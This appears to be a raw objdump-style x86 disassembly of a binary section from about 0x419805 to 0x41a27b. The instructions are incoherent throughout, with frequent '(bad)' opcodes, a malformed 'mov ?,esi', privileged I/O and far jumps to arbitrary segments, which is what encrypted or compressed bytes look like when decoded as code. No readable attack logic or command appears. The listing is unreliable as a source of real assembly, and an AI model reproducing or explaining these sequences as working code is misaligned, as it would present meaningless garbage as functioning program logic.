  419805:	sar    edi,1
  419807:	xchg   BYTE PTR ds:[edi+0x36],bl
  41980b:	pop    ebx
  41980c:	int    0x21
  41980e:	mov    ch,0x96
  419810:	xor    DWORD PTR [ecx],esi
  419812:	mov    ds:0xfddda7e4,eax
  419817:	xor    edi,DWORD PTR [ebx+0x3c3fb7b]
  41981d:	adc    eax,0x57e0aa27
  419822:	sti    
  419823:	ss dec edi
  419825:	jp     0x419865
  419827:	jle    0x41984a
  419829:	lea    eax,[ebx-0x10d40572]
  41982f:	and    BYTE PTR [ebx+0x4d],ch
  419832:	sahf   
  419833:	pop    edi
  419834:	mov    edi,0x2b4cb256
  419839:	(bad)  
  41983a:	mov    ch,0x8f
  41983c:	data16 (bad) 
  41983f:	inc    edi
  419840:	xor    al,0x25
  419842:	test   BYTE PTR [eax-0x55],ah
  419845:	jbe    0x4198a5
  419847:	aad    0xc4
  419849:	cmp    al,0x9
  41984b:	mov    ebx,0x2ea59783
  419850:	outs   dx,BYTE PTR ds:[esi]
  419851:	and    al,0x9b
  419853:	xlat   BYTE PTR ds:[ebx]
  419854:	not    DWORD PTR [ebx]
  419856:	mov    cl,0xea
  419858:	rcr    ecx,1
  41985a:	enter  0xec26,0xcc
  41985e:	loop   0x4198a5
  419860:	clc    
  419861:	mov    dl,0xd3
  419863:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419864:	clc    
  419865:	sub    BYTE PTR [ebx-0x36],al
  419868:	add    eax,0xbe8a2b1d
  41986d:	mov    ch,0x8a
  41986f:	std    
  419870:	dec    DWORD PTR [ebp-0x8]
  419873:	inc    esp
  419874:	test   BYTE PTR [edx-0x260faad2],ch
  41987a:	jecxz  0x4198d5
  41987c:	mov    ah,0x18
  41987e:	inc    ebp
  41987f:	adc    eax,0x4c82e5ce
  419884:	stc    
  419885:	sahf   
  419886:	mov    dh,0x6
  419888:	inc    eax
  419889:	lahf   
  41988a:	jecxz  0x419845
  41988c:	js     0x4198b2
  41988e:	fsubr  DWORD PTR [ebp+0x25]
	...
  4198f1:	add    BYTE PTR [eax],al
  4198f3:	add    BYTE PTR [edx-0x201eb8e7],al
  4198f9:	jmp    DWORD PTR [esi+0x45e3657b]
  4198ff:	(bad)  
  419901:	adc    al,0xec
  419903:	pop    edx
  419904:	or     BYTE PTR [edi],cl
  419906:	add    DWORD PTR [eax],eax
  419908:	add    eax,0x18000001
  41990d:	std    
  41990e:	jno    0x419890
  419910:	mov    ebp,0x5cbac593
  419915:	sub    eax,0x6d7dd862
  41991a:	adc    DWORD PTR [eax],0xffffffb6
  41991d:	jne    0x4198de
  41991f:	xor    al,0xce
  419921:	inc    ecx
  419922:	add    bl,ah
  419924:	ror    esp,cl
  419926:	sbb    eax,0xf863f3f3
  41992b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41992c:	pop    es
  41992d:	mov    al,ds:0x9ec9b7df
  419932:	sub    BYTE PTR [ebx+0x3c5e8a54],0x48
  419939:	fisub  WORD PTR [esi-0x3241b0c1]
  41993f:	lahf   
  419940:	xchg   esp,eax
  419941:	scas   eax,DWORD PTR es:[edi]
  419942:	repz pop esi
  419944:	jb     0x41993a
  419946:	and    esp,0xca03f95e
  41994c:	sub    ebp,edx
  41994e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41994f:	scas   al,BYTE PTR es:[edi]
  419950:	pop    ds
  419951:	and    DWORD PTR [ebp*1-0x4326e625],ebp
  419958:	jge    0x4198e9
  41995a:	or     al,0xc0
  41995c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41995d:	jno    0x4198f0
  41995f:	cmp    eax,0x839f34f0
  419964:	adc    al,0xba
  419966:	xor    al,cl
  419968:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419969:	xor    BYTE PTR [ebp+0x7760afb3],dh
  41996f:	jnp    0x419965
  419971:	jb     0x41992f
  419973:	ss jl  0x419989
  419976:	xor    edx,eax
  419978:	ds stos BYTE PTR es:[edi],al
  41997a:	leave  
  41997b:	es mov ah,0x2
  41997e:	sub    al,0x47
  419980:	add    BYTE PTR [ecx+0x5b110b15],ch
  419986:	xchg   ebx,eax
  419987:	scas   al,BYTE PTR es:[edi]
  419988:	iret   
  419989:	aad    0xb8
  41998b:	mov    ds:0x8b4b4a1b,al
  419990:	leave  
  419991:	xor    al,0x3e
  419993:	call   0xfbf99b62
  419998:	lock cmp al,0x3a
  41999b:	popf   
  41999c:	loopne 0x41996d
  41999e:	adc    BYTE PTR [edi+0x3d],dh
  4199a1:	call   0xdc3e0e04
  4199a6:	pushf  
  4199a7:	out    0x93,eax
  4199a9:	arpl   WORD PTR [ecx],di
  4199ab:	sub    dl,ah
  4199ad:	pop    edi
  4199ae:	sub    cl,0x5e
  4199b1:	mov    esp,0x33c2ad82
  4199b6:	mov    ah,dh
  4199b8:	sahf   
  4199b9:	and    dl,BYTE PTR [edx]
  4199bb:	lods   eax,DWORD PTR ds:[esi]
  4199bc:	ja     0x41996d
  4199be:	rol    BYTE PTR [ebx],cl
  4199c0:	ret    0xc4e6
  4199c3:	xor    dl,0xc5
  4199c6:	loope  0x4199d6
  4199c8:	or     ah,BYTE PTR ds:0xf3400358
  4199ce:	mov    ch,0xd8
  4199d0:	adc    BYTE PTR [esi-0x77ce9add],dh
  4199d6:	stos   BYTE PTR es:[edi],al
  4199d7:	push   edi
  4199d8:	loop   0x419a0c
  4199da:	mov    ?,esi
  4199dc:	int    0x56
  4199de:	sar    BYTE PTR [edx-0xa],cl
  4199e1:	test   DWORD PTR [eax],eax
  4199e3:	loope  0x4199e9
  4199e5:	(bad)  
  4199e6:	adc    DWORD PTR [esi-0x647846eb],edi
  4199ec:	jmp    0xa2:0xb62e5d71
  4199f3:	punpckhbw mm6,QWORD PTR [eax+0x58]
  4199f7:	aas    
  4199f8:	sbb    esp,DWORD PTR [edx]
  4199fa:	mov    esp,0x510ca662
  4199ff:	aaa    
  419a00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a01:	outs   dx,BYTE PTR ds:[esi]
  419a02:	mov    esi,gs
  419a04:	lea    ebx,[ecx-0xa]
  419a07:	inc    ecx
  419a08:	push   ss
  419a09:	xchg   esp,eax
  419a0a:	loopne 0x4199b3
  419a0c:	imul   ebp,DWORD PTR [edi+0xdea54f],0x0
	...
  419a72:	add    BYTE PTR [eax],al
  419a74:	xor    esi,DWORD PTR [ecx]
  419a76:	xchg   ebx,eax
  419a77:	lds    edx,FWORD PTR [ebx-0x34088819]
  419a7d:	rcl    DWORD PTR ds:0xc4f6e9c2,cl
  419a83:	scas   al,BYTE PTR es:[edi]
  419a84:	or     eax,0x5000110
  419a89:	add    DWORD PTR [eax],eax
  419a8b:	add    BYTE PTR [ebp-0x14807f7d],ah
  419a91:	pop    ebp
  419a92:	or     al,0xe
  419a94:	bound  ebp,QWORD PTR [ebp+0x4ac1351b]
  419a9a:	imul   edx,ecx,0x9309b535
  419aa0:	(bad)  
  419aa1:	cli    
  419aa2:	dec    edi
  419aa3:	cmp    eax,0x7242941b
  419aa8:	xor    BYTE PTR [edx*2-0x1bda197],dl
  419aaf:	push   0xffffffaa
  419ab1:	xchg   ecx,eax
  419ab2:	call   0x4cebb51a
  419ab7:	sub    bl,BYTE PTR [eax]
  419ab9:	icebp  
  419aba:	cwde   
  419abb:	sbb    BYTE PTR [edx],ah
  419abd:	(bad)  
  419abf:	cwde   
  419ac0:	ss mov dh,0xf2
  419ac3:	pop    ebp
  419ac4:	dec    esp
  419ac5:	das    
  419ac6:	xlat   BYTE PTR ds:[ebx]
  419ac7:	add    al,0x70
  419ac9:	rcr    BYTE PTR [esi-0x67],cl
  419acc:	or     BYTE PTR [edx-0x13],bh
  419acf:	mov    bl,0x58
  419ad1:	popf   
  419ad2:	and    ch,BYTE PTR [esi-0x51c5abb7]
  419ad8:	jmp    0x419b00
  419ada:	pop    ecx
  419adb:	or     BYTE PTR [edi+0x7a],bl
  419ade:	sub    DWORD PTR [ecx+0x1d],esi
  419ae1:	mov    esi,0x3549dbb4
  419ae6:	inc    ecx
  419ae7:	fyl2xp1 
  419ae9:	push   ds
  419aea:	push   ss
  419aeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419aec:	sub    DWORD PTR [ebx+0xd408c22],edx
  419af2:	jecxz  0x419abd
  419af4:	inc    edx
  419af5:	mov    edi,0x74699cfb
  419afa:	and    cl,BYTE PTR [esp+eax*4+0x2b]
  419afe:	mov    ebp,0x2003aa97
  419b03:	jecxz  0x419a8e
  419b05:	test   DWORD PTR [ebx+0x69],0x5f58f29d
  419b0c:	mov    bh,0xb6
  419b0e:	ret    0xaf7b
  419b11:	mov    bh,0xe5
  419b13:	jmp    0x1b17:0x11653b4f
  419b1a:	sbb    dh,BYTE PTR [edx]
  419b1c:	into   
  419b1d:	icebp  
  419b1e:	outs   dx,DWORD PTR ds:[esi]
  419b1f:	adc    DWORD PTR [ebp+0x2b],0xffffffee
  419b23:	pop    ecx
  419b24:	mov    al,0xd5
  419b26:	inc    ecx
  419b27:	out    0xb6,al
  419b29:	ret    0x771d
  419b2c:	mov    ds:0xd9ba3073,al
  419b31:	lea    ebx,[esi+eiz*2+0x33511fdd]
  419b38:	push   ebp
  419b39:	pop    edx
  419b3a:	or     DWORD PTR [ebx+0x6d],ebx
  419b3d:	addr16 icebp 
  419b3f:	test   BYTE PTR [eax],dl
  419b41:	(bad)  
  419b42:	push   0xffffffad
  419b44:	cmp    edx,DWORD PTR [esi-0x6c216ea3]
  419b4a:	into   
  419b4b:	add    ah,BYTE PTR [ebx-0x661b4c36]
  419b51:	inc    ebp
  419b52:	call   0x1a7340eb
  419b57:	push   ds
  419b58:	cmp    eax,0x178cba85
  419b5d:	(bad)  
  419b5e:	cmc    
  419b5f:	aas    
  419b60:	mov    ds:0x2f08fca2,eax
  419b65:	fstp   QWORD PTR cs:[esi]
  419b68:	adc    DWORD PTR [edx+0x73de873e],ebx
  419b6e:	mov    edi,0xa020da6e
  419b73:	adc    eax,0x814e1dd9
  419b78:	add    al,0x6c
  419b7a:	repnz enter 0x1d38,0x42
  419b7f:	mov    al,bl
  419b81:	loopne 0x419bdd
  419b83:	sbb    DWORD PTR [edx+0x1a],ebx
  419b86:	xchg   ebp,eax
  419b87:	mov    cl,0x1b
  419b89:	rcr    BYTE PTR [edx-0x20],0x27
  419b8d:	jp     0x419b6e
  419b8f:	pop    ds
  419b90:	jbe    0x419b92
	...
  419bf2:	add    BYTE PTR [eax],al
  419bf4:	dec    edx
  419bf5:	(bad)  
  419bf6:	cli    
  419bf7:	inc    edi
  419bf8:	(bad)  
  419bf9:	jg     0x419bfa
  419bfb:	int    0x88
  419bfd:	xchg   ecx,eax
  419bfe:	lods   al,BYTE PTR ds:[esi]
  419bff:	or     al,0x25
  419c01:	retf   
  419c02:	mov    ebp,0x11112c8
  419c07:	add    BYTE PTR ds:0xac000001,al
  419c0d:	push   0x66faec4b
  419c12:	push   ebx
  419c13:	test   eax,0x672f226e
  419c18:	sbb    ebx,edi
  419c1a:	xor    eax,0x616d363c
  419c1f:	pop    edi
  419c20:	sbb    ch,BYTE PTR [edi+0x1b]
  419c23:	pop    ss
  419c24:	icebp  
  419c25:	sbb    eax,0xc8e8bbd6
  419c2a:	sar    ebp,0x7e
  419c2d:	lods   al,BYTE PTR ds:[esi]
  419c2e:	test   eax,0x1a19bde7
  419c33:	and    DWORD PTR [edi-0x411b7a47],ecx
  419c39:	mov    ebp,0x148d2d8a
  419c3e:	mov    edi,0xd4e8b23c
  419c43:	add    al,0xce
  419c45:	cmp    eax,DWORD PTR [ebp-0x33075b09]
  419c4b:	retf   0x74af
  419c4e:	push   ss
  419c4f:	leave  
  419c50:	ret    0x7a2f
  419c53:	jl     0x419c37
  419c55:	jnp    0x419c2a
  419c57:	cli    
  419c58:	inc    edi
  419c59:	enter  0x5b79,0x43
  419c5d:	adc    eax,0x78595c48
  419c62:	int    0x64
  419c64:	mov    esi,0xe3dfbd13
  419c69:	and    DWORD PTR ss:[eax-0x6e527299],ebp
  419c70:	mov    ecx,0x35cbfbe4
  419c75:	repz aam 0xae
  419c78:	mov    eax,ds:0x604c0d40
  419c7d:	aam    0xbb
  419c7f:	(bad)  
  419c80:	ins    BYTE PTR es:[edi],dx
  419c81:	fwait
  419c82:	cmp    eax,0x40f71474
  419c87:	xchg   DWORD PTR [edx+0x586dc46c],esi
  419c8d:	pop    ebp
  419c8e:	and    al,0x91
  419c90:	push   edi
  419c91:	mov    ds:0x90cb6278,eax
  419c96:	pop    ebx
  419c97:	push   esp
  419c98:	mov    al,ds:0xba70969a
  419c9d:	mov    al,0x55
  419c9f:	nop
  419ca0:	mov    eax,ds:0x706f7cc8
  419ca5:	pop    edi
  419ca6:	mov    WORD PTR [ecx+0x4888921d],fs
  419cac:	dec    edx
  419cad:	call   0xb3cc:0x989a0d89
  419cb4:	mov    edi,DWORD PTR [edi-0x32d8d005]
  419cba:	aam    0x8e
  419cbc:	shl    BYTE PTR [ebp-0x60],0x95
  419cc0:	inc    ecx
  419cc1:	cmp    esi,DWORD PTR [edi-0x3e]
  419cc4:	mov    cl,0x5f
  419cc6:	icebp  
  419cc7:	xlat   BYTE PTR ds:[ebx]
  419cc8:	jle    0x419d1a
  419cca:	mov    ds:0x3ffbc6a7,al
  419ccf:	sbb    al,0x18
  419cd1:	mov    dl,0xe
  419cd3:	addr16 cwde 
  419cd5:	je     0x419d17
  419cd7:	stos   DWORD PTR es:[edi],eax
  419cd8:	jbe    0x419ce6
  419cda:	push   ss
  419cdb:	push   edx
  419cdc:	cli    
  419cdd:	imul   DWORD PTR [edx+0x23efcf5f]
  419ce3:	pop    ss
  419ce4:	mov    dh,0x2b
  419ce6:	rcr    DWORD PTR [ecx-0x8],0x7d
  419cea:	xchg   BYTE PTR cs:[ebp+0x4e],al
  419cee:	gs jo  0x419c90
  419cf1:	sub    dl,BYTE PTR [edi]
  419cf3:	test   al,0x79
  419cf5:	pusha  
  419cf6:	test   BYTE PTR [edx+eax*1-0x63b547e7],dh
  419cfd:	outs   dx,BYTE PTR ds:[esi]
  419cfe:	call   0x3e21c4d
  419d03:	retf   0x9842
  419d06:	sti    
  419d07:	rcr    dl,1
  419d09:	sub    esp,DWORD PTR [edx-0x7e]
  419d0c:	popa   
  419d0d:	dec    esp
  419d0e:	xor    DWORD PTR [ebx+ecx*4],edx
	...
  419d71:	add    BYTE PTR [eax],al
  419d73:	add    al,dh
  419d75:	xchg   edi,eax
  419d76:	std    
  419d77:	cmp    al,0xff
  419d79:	jle    0x419d6c
  419d7b:	fistp  QWORD PTR [edi-0x16]
  419d7e:	fiadd  DWORD PTR ss:[esi+ecx*1]
  419d82:	or     BYTE PTR [edx],cl
  419d84:	pop    ss
  419d85:	adc    al,BYTE PTR [ecx]
  419d87:	add    BYTE PTR ds:0x7e000001,al
  419d8d:	fcom   st(3)
  419d8f:	or     BYTE PTR [esi+ecx*2+0x592a4c1],bh
  419d96:	lahf   
  419d97:	xchg   edi,eax
  419d98:	aas    
  419d99:	jecxz  0x419e06
  419d9b:	popf   
  419d9c:	pop    esi
  419d9d:	in     al,dx
  419d9e:	cld    
  419d9f:	rol    BYTE PTR [edi-0x44fcbc78],0x44
  419da6:	inc    edi
  419da7:	popf   
  419da8:	icebp  
  419da9:	jo     0x419d32
  419dab:	test   BYTE PTR ds:[ebx-0x6d],ah
  419daf:	call   0xd0b5:0xc4aac008
  419db6:	loop   0x419d94
  419db8:	dec    edx
  419db9:	ret    
  419dba:	ss sahf 
  419dbc:	addr16 mov cs,esi
  419dbf:	and    DWORD PTR [eax+eiz*2],ebx
  419dc2:	xchg   DWORD PTR [esi],esi
  419dc4:	loope  0x419dc0
  419dc6:	mov    esi,0xa64ba27a
  419dcb:	sub    DWORD PTR [eax],edi
  419dcd:	jae    0x419d6a
  419dcf:	inc    eax
  419dd0:	ror    DWORD PTR [esi-0x4d9d2e7e],0xb1
  419dd7:	xor    eax,0xf6e56d3b
  419ddc:	out    0x2,al
  419dde:	arpl   WORD PTR [ebx],di
  419de0:	(bad)  
  419de1:	fisubr DWORD PTR [esi+0x1bb43727]
  419de7:	out    dx,eax
  419de8:	push   ecx
  419de9:	popa   
  419dea:	ja     0x419df2
  419dec:	sbb    eax,0x580d0a2a
  419df1:	test   al,0x6d
  419df3:	and    al,BYTE PTR [eax+0x40e88ca]
  419df9:	stos   DWORD PTR es:[edi],eax
  419dfa:	dec    ebp
  419dfb:	bound  eax,QWORD PTR [ebp-0x364345a1]
  419e01:	pushf  
  419e02:	push   0x29e985cb
  419e07:	shl    DWORD PTR [edi+edi*8-0x4fa64d7f],0x36
  419e0f:	fs clc 
  419e11:	and    eax,0x48dee2c6
  419e16:	adc    eax,0x535ef23e
  419e1b:	hlt    
  419e1c:	repz addr16 call 0x87a16644
  419e23:	pop    ebx
  419e24:	jle    0x419dd4
  419e26:	pop    esp
  419e27:	mov    eax,ds:0x33064766
  419e2c:	cmp    al,0xf5
  419e2e:	fcmovne st,st(7)
  419e30:	mov    esi,DWORD PTR [ecx]
  419e32:	(bad)
  419e37:	fwait
  419e38:	call   0x62d6746f
  419e3d:	pop    ebx
  419e3e:	leave  
  419e3f:	pop    ds
  419e40:	pop    eax
  419e41:	loope  0x419e55
  419e43:	jecxz  0x419e13
  419e45:	mov    esi,0xfb7a18a4
  419e4a:	adc    al,0xc
  419e4c:	pop    es
  419e4d:	into   
  419e4e:	dec    ebp
  419e4f:	dec    esp
  419e50:	retf   0x3592
  419e53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e54:	fild   WORD PTR [eax+0x77]
  419e57:	fstp   st(4)
  419e59:	in     al,dx
  419e5a:	lods   eax,DWORD PTR ds:[esi]
  419e5b:	pop    ss
  419e5c:	or     eax,0x7e9e2e30
  419e61:	push   edx
  419e62:	cmc    
  419e63:	push   esi
  419e64:	push   ebx
  419e65:	xchg   BYTE PTR [eax],bh
  419e67:	gs push ebx
  419e69:	mov    ebx,0xf18285e
  419e6e:	jmp    0x419e72
  419e70:	mov    edx,0x51c5dccb
  419e75:	push   edx
  419e76:	arpl   WORD PTR [ecx-0x77478a49],bx
  419e7c:	neg    BYTE PTR [ebp+0x4]
  419e7f:	and    BYTE PTR [esi+0x64675a76],dl
  419e85:	ja     0x419ef7
  419e87:	lock xchg esi,eax
  419e89:	dec    ebx
  419e8a:	ins    DWORD PTR es:[edi],dx
  419e8b:	xchg   ebp,eax
  419e8c:	std    
  419e8d:	xor    dh,ah
  419e8f:	push   ebp
  419e90:	xchg   edx,eax
	...
  419ef1:	add    BYTE PTR [eax],al
  419ef3:	add    BYTE PTR [edi+0x5fc517d8],al
  419ef9:	iret   
  419efa:	xlat   BYTE PTR ds:[ebx]
  419efb:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419eff:	inc    esi
  419f00:	aam    0x73
  419f02:	enter  0x1c69,0x13
  419f06:	add    DWORD PTR [eax],eax
  419f08:	add    eax,0x33000001
  419f0d:	inc    esi
  419f0e:	dec    esi
  419f0f:	push   eax
  419f10:	pop    edx
  419f11:	inc    ebx
  419f12:	js     0x419f0a
  419f14:	arpl   ax,dx
  419f16:	fdiv   DWORD PTR [ebx]
  419f18:	out    0x68,al
  419f1a:	adc    al,0x4e
  419f1c:	fcomp  DWORD PTR [eax-0x5c]
  419f1f:	inc    esi
  419f20:	push   ds
  419f21:	rol    ah,cl
  419f23:	cmp    al,dh
  419f25:	sub    edi,DWORD PTR [ecx]
  419f27:	mov    esp,0x66760f81
  419f2c:	(bad)  
  419f2d:	nop
  419f2e:	and    ebx,DWORD PTR [edx]
  419f30:	aaa    
  419f31:	mov    BYTE PTR [esi+ebp*2-0x36],dl
  419f35:	add    al,0x68
  419f37:	aaa    
  419f38:	loop   0x419f29
  419f3a:	mov    edi,0xd71ce584
  419f3f:	mov    dh,0x8b
  419f41:	add    bh,0x17
  419f44:	aad    0xcb
  419f46:	call   0x9a997538
  419f4b:	cli    
  419f4c:	arpl   WORD PTR [ecx-0x219311ad],si
  419f52:	mov    cl,0x87
  419f54:	scas   eax,DWORD PTR es:[edi]
  419f55:	rcl    bl,0xad
  419f58:	pop    ecx
  419f59:	or     esp,esi
  419f5b:	mov    edx,0xa7be5041
  419f60:	rol    DWORD PTR [edi],1
  419f62:	scas   eax,DWORD PTR es:[edi]
  419f63:	enter  0x13cc,0xb3
  419f67:	outs   dx,DWORD PTR ds:[esi]
  419f68:	inc    edx
  419f69:	add    BYTE PTR [ecx],ch
  419f6b:	mov    ecx,DWORD PTR [eax+0x2]
  419f6e:	or     DWORD PTR [edx+0x22a0e591],ebp
  419f74:	cmp    ecx,DWORD PTR [ebx+0x3c296762]
  419f7a:	mov    cl,0xb3
  419f7c:	fdivr  DWORD PTR [eax+ebx*8]
  419f7f:	out    dx,al
  419f80:	je     0x419ffb
  419f82:	mov    dh,0x61
  419f84:	pop    esp
  419f85:	mov    dl,0xaa
  419f87:	cmc    
  419f88:	std    
  419f89:	jp     0x419f68
  419f8b:	push   ecx
  419f8c:	imul   BYTE PTR [esi]
  419f8e:	aas    
  419f8f:	ficomp WORD PTR [esi+esi*4+0x6e]
  419f93:	jmp    0x419fb8
  419f95:	into   
  419f96:	retf   0x3b36
  419f99:	xchg   esi,eax
  419f9a:	out    0x2,al
  419f9c:	sub    bh,dh
  419f9e:	push   edx
  419f9f:	push   ecx
  419fa0:	mov    al,0xb5
  419fa2:	jno    0x419f7c
  419fa4:	ins    BYTE PTR es:[edi],dx
  419fa5:	bound  edi,QWORD PTR [edi+esi*1]
  419fa8:	loopne 0x419f40
  419faa:	jb     0x419fcd
  419fac:	fld    QWORD PTR [ecx-0x60f6a99d]
  419fb2:	(bad)  
  419fb3:	in     eax,0xee
  419fb5:	cmp    eax,0xf927704
  419fba:	mov    BYTE PTR [esi-0xf],bh
  419fbd:	mov    bh,0x3a
  419fbf:	in     al,0xa8
  419fc1:	mov    eax,DWORD PTR [ebx+0x2e]
  419fc4:	iret   
  419fc5:	ins    DWORD PTR es:[edi],dx
  419fc6:	(bad)  
  419fc7:	xor    BYTE PTR [ecx+0x7792bf22],dl
  419fcd:	shr    DWORD PTR [edx],cl
  419fcf:	mov    eax,ebx
  419fd1:	jns    0x41a041
  419fd3:	push   ds
  419fd4:	sbb    ch,BYTE PTR [edx+0x3d]
  419fd7:	cwde   
  419fd8:	sub    al,0xd7
  419fda:	sub    eax,0xdbac92a0
  419fdf:	sbb    dh,bh
  419fe1:	stos   DWORD PTR es:[edi],eax
  419fe2:	(bad)  
  419fe4:	xchg   ebp,eax
  419fe5:	dec    ebx
  419fe6:	gs inc eax
  419fe8:	inc    edi
  419fe9:	cwde   
  419fea:	mov    al,ds:0xc035e85f
  419fef:	sub    BYTE PTR [esi+0x76],al
  419ff2:	mov    edi,0xd6a142fa
  419ff7:	xor    al,0x34
  419ff9:	test   ecx,edx
  419ffb:	xchg   esp,eax
  419ffc:	sti    
  419ffd:	mov    dh,BYTE PTR [ecx+0x75]
  41a000:	mov    DWORD PTR [edx],eax
  41a002:	or     al,0xb4
  41a004:	or     ebx,DWORD PTR [ebx+0x6f]
  41a007:	mov    edi,0x799efd9d
  41a00c:	inc    edx
  41a00d:	icebp  
  41a00e:	pop    ecx
  41a00f:	mov    ds:0x97,al
	...
  41a074:	dec    esi
  41a075:	jmp    0x41a0a1
  41a077:	dec    esi
  41a078:	scas   eax,DWORD PTR es:[edi]
  41a079:	iret   
  41a07a:	outs   dx,BYTE PTR ds:[esi]
  41a07b:	jmp    0x41a000
  41a07d:	push   edx
  41a07e:	test   BYTE PTR [eax-0x62],bh
  41a081:	arpl   WORD PTR [edi-0x2],dx
  41a084:	and    DWORD PTR [ecx+eax*1],edx
  41a087:	add    BYTE PTR ds:0xd0000001,al
  41a08d:	retf   
  41a08e:	mov    DWORD PTR [ebx-0x158fd903],ebp
  41a094:	push   ds
  41a095:	iret   
  41a096:	cmp    eax,0xdde264c6
  41a09b:	adc    al,0x44
  41a09d:	dec    esp
  41a09e:	inc    DWORD PTR [ebx]
  41a0a0:	mov    eax,0x54c6c8be
  41a0a5:	sub    DWORD PTR [ebx+0x24],edx
  41a0a8:	xor    ah,0xc
  41a0ab:	xor    DWORD PTR [ebp-0x10d59307],0xffffffad
  41a0b2:	icebp  
  41a0b3:	or     eax,DWORD PTR [esi-0x67a2ae23]
  41a0b9:	or     edi,DWORD PTR [edi+0x7aac0076]
  41a0bf:	rol    ebp,cl
  41a0c1:	mov    BYTE PTR [edi-0x133434b7],0x19
  41a0c8:	sbb    eax,esi
  41a0ca:	shl    dh,cl
  41a0cc:	push   ds
  41a0cd:	jno    0x41a10f
  41a0cf:	xchg   edx,eax
  41a0d0:	popf   
  41a0d1:	cmp    ch,BYTE PTR [eax-0x45]
  41a0d4:	loopne 0x41a092
  41a0d6:	cs mov edi,0x154dd5a4
  41a0dc:	pop    esi
  41a0dd:	xor    eax,0xa24a5450
  41a0e2:	dec    ecx
  41a0e3:	push   esp
  41a0e4:	(bad)  
  41a0e5:	sbb    ebx,DWORD PTR [edi+0x25]
  41a0e8:	sub    eax,0x49fac119
  41a0ed:	outs   dx,DWORD PTR ds:[esi]
  41a0ee:	int3   
  41a0ef:	cmovle esp,DWORD PTR [bp+si-0x3e]
  41a0f4:	add    esp,DWORD PTR [esi+eiz*8+0x78b8ad02]
  41a0fb:	jl     0x41a100
  41a0fd:	dec    edi
  41a0fe:	pop    ss
  41a0ff:	mov    ah,0x5d
  41a101:	repz jne 0x41a12a
  41a104:	(bad)  [ebp+0x75311dfc]
  41a10a:	cmp    al,BYTE PTR [esi+0x77b8584a]
  41a110:	pusha  
  41a111:	cli    
  41a112:	dec    esp
  41a113:	xchg   ecx,eax
  41a114:	mov    ch,0x7e
  41a116:	lock cmp DWORD PTR [eax-0x6a],ebx
  41a11a:	cdq    
  41a11b:	inc    ebx
  41a11c:	cdq    
  41a11d:	cmp    ecx,DWORD PTR [ebx+0x5f]
  41a120:	cs cli 
  41a122:	xchg   edx,eax
  41a123:	dec    esi
  41a124:	dec    esp
  41a125:	xchg   BYTE PTR [edi],al
  41a127:	or     eax,DWORD PTR [ebp+0x1fbee857]
  41a12d:	pop    ds
  41a12e:	aad    0x79
  41a130:	add    al,0xe8
  41a132:	imul   edx,DWORD PTR [ebx],0x3ade84fd
  41a138:	mov    al,ds:0x1aec3f42
  41a13d:	fs mov ah,0xa5
  41a140:	pop    ebp
  41a141:	cwde   
  41a142:	adc    ecx,0xffffff83
  41a145:	out    0xf7,al
  41a147:	inc    ecx
  41a148:	mov    BYTE PTR [edx],bl
  41a14a:	jl     0x41a0db
  41a14c:	imul   esi,DWORD PTR [edi-0x3c],0xffffffd6
  41a150:	out    dx,al
  41a151:	shl    DWORD PTR [eax-0x4a],cl
  41a154:	and    eax,0xba97b107
  41a159:	sbb    al,0xf9
  41a15b:	jno    0x41a147
  41a15d:	xchg   al,bh
  41a15f:	sub    dh,BYTE PTR [ebp-0x3b]
  41a162:	test   eax,0xace31f75
  41a167:	loop   0x41a1c7
  41a169:	xchg   BYTE PTR [ecx-0x37],ch
  41a16c:	xor    eax,0x8d9d3516
  41a171:	loopne 0x41a13b
  41a173:	adc    eax,0x56c4ce1d
  41a178:	cmp    al,0x7f
  41a17a:	dec    ecx
  41a17b:	jg     0x41a179
  41a17d:	pop    es
  41a17e:	sbb    BYTE PTR [ecx+0xf198631],ch
  41a184:	adc    eax,DWORD PTR [edi]
  41a186:	js     0x41a195
  41a188:	sub    eax,DWORD PTR [ecx]
  41a18a:	lds    edx,FWORD PTR [ebx]
  41a18c:	add    DWORD PTR [eax+0x600d14],0x0
	...
  41a1f3:	add    BYTE PTR [esp+ecx*1],bl
  41a1f6:	std    
  41a1f7:	sbb    ebp,edi
  41a1f9:	stc    
  41a1fa:	cld    
  41a1fb:	or     eax,0x398d6850
  41a200:	pop    edx
  41a201:	cmp    dl,BYTE PTR [eax+0x1152652]
  41a207:	add    BYTE PTR ds:0x9f000001,al
  41a20d:	daa    
  41a20e:	mov    edi,0xdce3d396
  41a213:	push   edi
  41a214:	adc    dl,bh
  41a216:	pusha  
  41a217:	in     al,dx
  41a218:	xchg   ebp,eax
  41a219:	ret    
  41a21a:	mov    ebp,0x225e0277
  41a21f:	inc    eax
  41a220:	mov    DWORD PTR [eax-0x68],eax
  41a223:	add    al,0x51
  41a225:	mov    esi,0xf0a62528
  41a22a:	mov    esi,0x8f5f23c
  41a22f:	icebp  
  41a230:	dec    esi
  41a231:	mov    gs,ebp
  41a233:	add    cl,BYTE PTR [edi]
  41a235:	jl     0x41a255
  41a237:	mov    esp,0xd2a2f974
  41a23c:	mov    ecx,0xe1f6915c
  41a241:	xor    DWORD PTR ds:[edx+0x22da0bc0],edi
  41a248:	imul   esi
  41a24a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a24b:	and    eax,0xe8215987
  41a250:	js     0x41a2ce
  41a252:	add    al,0x3d
  41a254:	sub    dh,BYTE PTR [esi]
  41a256:	fld    TBYTE PTR [ecx]
  41a258:	arpl   WORD PTR [esi],cx
  41a25a:	pop    edx
  41a25b:	aad    0x98
  41a25d:	sub    DWORD PTR [eax+0x3afffcaf],ecx
  41a263:	jecxz  0x41a20d
  41a265:	in     eax,0xfa
  41a267:	sbb    dh,BYTE PTR ss:[edx+0x1a603963]
  41a26e:	scas   eax,DWORD PTR es:[edi]
  41a26f:	loope  0x41a263
  41a271:	cdq    
  41a272:	cmp    ch,BYTE PTR [esi]
  41a274:	test   BYTE PTR [esi],ah
  41a276:	dec    edi
  41a277:	ror    DWORD PTR [ebx],0x3d
  41a27a:	(bad)  
  41a27b:	(bad)  
